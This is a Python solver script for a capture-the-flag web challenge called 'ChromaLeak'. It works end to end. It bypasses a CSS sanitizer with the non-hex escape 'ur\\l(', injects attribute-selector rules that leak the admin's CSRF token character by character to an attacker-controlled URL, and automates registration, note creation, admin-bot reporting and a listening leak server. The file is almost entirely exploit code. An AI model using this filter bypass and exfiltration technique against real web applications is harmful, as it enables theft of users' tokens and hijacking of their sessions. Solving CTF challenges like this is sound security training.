"""
ChromaLeak - CSS Injection CTF Solver
======================================

Exploit: CSS attribute selector exfiltration via non-hex CSS escape bypass.

Vulnerability:
    The CSS sanitizer blocks `url(` and hex CSS escapes like `\\75` (\\[0-9a-fA-F]{1,6}).
    However, CSS also supports escaping non-hex characters: `\\l` resolves to `l`.
    Since 'l' is NOT a hex digit (hex = 0-9, a-f), the escape filter doesn't catch `\\l`.
    Therefore `ur\\l(` bypasses the `url(` filter AND the hex escape filter,
    but the CSS engine interprets it as `url(`.

Attack:
    1. Create a note with CSS that uses attribute selectors to test each possible
       next character of the admin's CSRF token (which is the flag).
    2. For each candidate character, include a rule like:
       input[name="csrf_token"][value^="Pioneers25{x"] { background-image: ur\\l(http://ATTACKER/leak?v=Pioneers25{x); }
    3. Report the note to the admin bot.
    4. The admin visits the note; the CSS engine matches the correct selector
       and fires an HTTP request to the attacker's server.
    5. Repeat, appending one character at a time, until the full flag is extracted.

Usage:
    1. Start the challenge: docker-compose up
    2. Set ATTACKER_HOST below (use 127.0.0.1:8888 for local, or your IP/ngrok for remote)
    3. Run: python solver.py
    4. The script will extract the flag character by character.

Requirements:
    pip install requests
"""

import requests
import string
import time
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys
import urllib.parse

# ============ CONFIG ============
if len(sys.argv) < 3:
    print("Usage: python solver.py <TARGET_URL> <ATTACKER_URL> [LEAK_PORT]")
    print("Example: python solver.py http://20.199.128.9:4002 https://abc.ngrok-free.app")
    sys.exit(1)

TARGET_URL    = sys.argv[1].rstrip("/")
ATTACKER_HOST = sys.argv[2].rstrip("/")
LEAK_PORT     = int(sys.argv[3]) if len(sys.argv) > 3 else 8888
USERNAME      = "solver_" + str(int(time.time()) % 10000)
PASSWORD      = "s0lver_p4ss!"
CHARSET       = string.ascii_lowercase + string.digits + "{}_!@#"
ROUND_TIMEOUT = 15       # seconds to wait for a leak per round
REPORT_COOLDOWN = 31     # rate limit is 30s
FLAG_PREFIX   = "Pioneers25{"
# ================================


class LeakServer(BaseHTTPRequestHandler):
    leaked_value = None

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        if 'v' in params:
            LeakServer.leaked_value = params['v'][0]
            print(f"  [LEAK] Got: {LeakServer.leaked_value}")

        self.send_response(200)
        self.send_header('Content-Type', 'image/gif')
        self.send_header('Content-Length', '43')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(
            b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'
            b'\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,'
            b'\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
        )

    def log_message(self, *a):
        pass


def start_leak_server():
    srv = HTTPServer(('0.0.0.0', LEAK_PORT), LeakServer)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    print(f"[*] Leak server on :{LEAK_PORT}")
    return srv


def auth():
    s = requests.Session()
    print(f"[*] Registering '{USERNAME}'...")
    r = s.post(f"{TARGET_URL}/register",
               data={"username": USERNAME, "password": PASSWORD},
               allow_redirects=True)
    if "already taken" in r.text.lower():
        s.post(f"{TARGET_URL}/login",
               data={"username": USERNAME, "password": PASSWORD},
               allow_redirects=True)
    r = s.get(f"{TARGET_URL}/dashboard")
    assert USERNAME in r.text, "Auth failed!"
    print(f"[+] Logged in as '{USERNAME}'")
    return s


def build_css(known):
    rules = []
    for ch in CHARSET:
        val = known + ch
        css_val = val.replace('"', '\\"')
        leak = f"{ATTACKER_HOST}/leak?v={urllib.parse.quote(val)}"
        rules.append(
            f'input[name="csrf_token"][value^="{css_val}"] '
            f'{{ background-image: ur\\l({leak}); }}'
        )
    return '\n'.join(rules)


def create_note(s, css, n):
    r = s.post(f"{TARGET_URL}/create",
               data={"title": f"Theme #{n}", "content": "Check this theme!", "css": css},
               allow_redirects=True)
    if '/note/' in r.url:
        return r.url
    return None


def report(s, url):
    r = s.post(f"{TARGET_URL}/api/report",
               json={"url": url})
    d = r.json()
    if d.get('success'):
        print(f"  [*] Reported, admin will visit...")
        return True
    print(f"  [!] Report failed: {d.get('error')}")
    return False


def solve():
    print("=" * 55)
    print(" ChromaLeak - CSS Injection Solver")
    print("=" * 55, "\n")

    start_leak_server()
    s = auth()

    known = FLAG_PREFIX
    rnd = 0

    print(f"\n[*] Starting from: '{known}'")
    print(f"[*] Charset size: {len(CHARSET)}\n")

    while not known.endswith("}"):
        rnd += 1
        print(f"--- Round {rnd}  (known='{known}') ---")
        LeakServer.leaked_value = None

        css = build_css(known)
        print(f"  [*] Payload: {len(css)} bytes")

        url = create_note(s, css, rnd)
        if not url:
            print("  [!] Note creation failed, retrying...")
            continue
        print(f"  [*] Note: {url}")

        if not report(s, url):
            print(f"  [*] Waiting {REPORT_COOLDOWN}s (rate limit)...")
            time.sleep(REPORT_COOLDOWN)
            report(s, url)

        print(f"  [*] Waiting for leak...")
        deadline = time.time() + ROUND_TIMEOUT
        while time.time() < deadline and LeakServer.leaked_value is None:
            time.sleep(0.3)

        if LeakServer.leaked_value:
            known = LeakServer.leaked_value
            print(f"  [+] => '{known}'\n")
        else:
            print(f"  [!] No leak! Retrying after cooldown...")
            rnd -= 1
            time.sleep(REPORT_COOLDOWN)
            continue

        if not known.endswith("}"):
            print(f"  [*] Cooldown {REPORT_COOLDOWN}s...")
            time.sleep(REPORT_COOLDOWN)

    print("\n" + "=" * 55)
    print(f" FLAG: {known}")
    print("=" * 55)


if __name__ == "__main__":
    solve()